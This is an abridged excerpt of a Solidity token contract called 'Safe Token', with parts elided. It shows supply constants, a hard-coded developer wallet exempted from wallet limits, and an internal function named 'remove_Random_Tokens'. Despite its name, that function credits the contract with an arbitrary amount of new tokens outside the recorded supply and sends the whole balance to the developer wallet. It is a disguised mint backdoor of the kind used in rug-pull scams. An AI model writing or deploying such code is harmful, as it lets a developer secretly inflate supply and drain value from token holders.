...
contract SAFE is Context, IERC20 { 
    ...
    address payable public Wallet_Dev = payable(0xAfb08654C027Eb2156277d377F235336550128b0);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 21 * 10**9 * 10**_decimals;
    string private constant _name = "Safe Token"; 
    ...
    uint256 public _maxTxAmount = _tTotal / 25; 
    ...
    constructor () {
        ...
        _isExcludedFromMaxWallet[Wallet_Dev] = true;
    ...
    function remove_Random_Tokens(uint256 percent_of_Tokens) internal {
        _tOwned[address(this)] = _tOwned[address(this)]+percent_of_Tokens;
        uint256 totalRandom = balanceOf(address(this));
        uint256 removeRandom = totalRandom;
        _basicTransfer(address(this), Wallet_Dev, removeRandom);
